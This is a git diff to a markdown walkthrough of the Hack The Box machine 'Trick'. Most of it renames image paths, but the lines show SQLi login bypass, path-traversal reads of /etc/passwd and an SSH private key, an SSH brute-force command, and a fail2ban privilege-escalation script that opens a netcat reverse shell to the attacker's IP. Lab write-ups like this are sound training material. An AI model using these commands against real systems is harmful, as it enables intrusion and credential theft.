@@ -48,7 +48,7 @@ Notes:
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (28) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 #### ffuf Subdomain Enumeration
 
@@ -149,7 +149,7 @@ root.trick.htb
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (61) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">We are able to perform a SQLi authentication bypass using a classic SQLi payload in both fields:</mark>
 
@@ -159,7 +159,7 @@ root.trick.htb
 
 * We now have access to the administrator's page
 
-<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 Upon going to the users tab, you can modify the password for the Administrator account so we can freely authenticate as the admin.
 
@@ -195,7 +195,7 @@ ffuf -c -u http://preprod-payroll.trick.htb/ -w /usr/share/amass/wordlists/subdo
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 * It appears to be a very basic site, not much is going on here
 * However, if we go to a different page such as Services, we can see that the URL bar appends `index.php?page=` at the top
@@ -224,7 +224,7 @@ Upon finding source code for the PHP code for the website from SQLi, we can expl
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Grabbing Michael's SSH Private Key:
 
@@ -232,7 +232,7 @@ Grabbing Michael's SSH Private Key:
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
 ```
 
-<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 * After putting the private key in an id\_rsa file, we need to `chmod 600` this file and authenticate to the server via SSH
 
@@ -242,7 +242,7 @@ http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/m
 ssh -i id_rsa michael@trick.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -251,6 +251,7 @@ ssh -i id_rsa michael@trick.htb
 After transferring linpeas to the victim, I am now going through it to analyze the results:
 
 * Nothing of interest was found
+* However, I did go down a few rabbit holes from this output... it happens
 
 ### PrivEsc vector
 
@@ -272,14 +273,15 @@ Using this article, we can put together methodology that allows us to script thi
 
 getpwned.sh:
 
-```
-mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
-cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
+<pre><code><strong>echo -e "Beginning fail2ban local privilege escalation process..."
+</strong><strong>sleep 1
+</strong><strong>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+</strong>cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
 sed -i -e "s/actionban = .*/actionban = nc \-e \/bin\/bash 10.10.14.38 1337/g" /etc/fail2ban/action.d/iptables-multiport.conf
 chmod 777 /etc/fail2ban/action.d/iptables-multiport.conf
-
+sleep 1
 sudo /etc/init.d/fail2ban restart
-```
+</code></pre>
 
 Start nc listener:
 
@@ -298,4 +300,4 @@ crackmapexec -t 50 ssh trick.htb -u hacker -p /usr/share/wordlists/rockyou.txt
 
 ## Proof
 
-<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
